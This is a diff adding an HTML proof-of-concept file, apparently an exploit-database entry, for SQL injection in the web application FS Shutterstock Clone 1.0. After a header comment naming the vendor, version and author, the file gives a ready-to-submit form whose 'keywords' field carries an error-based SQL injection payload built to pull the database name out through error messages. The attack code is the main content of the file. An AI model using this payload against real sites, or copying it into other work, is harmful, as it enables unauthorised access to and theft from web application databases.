@@ -1,0 +1,30 @@
+<!--
+# # # # # 
+# Exploit Title: FS Shutterstock Clone 1.0 - SQL Injection
+# Dork: N/A
+# Date: 08.12.2017
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/shutterstock-clone/
+# Demo: http://shutterstock-clone.demonstration.co.in/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+-->
+<html>
+<body>
+<form method="post" action="http://server/Category/">
+<input name="keywords" id="keywords" value="1'and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e,0x494853414e2053454e43414e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND ''='" type="text">
+<button type="submit">Ver Ayari</button>
+</form>
+</body>
+</html>
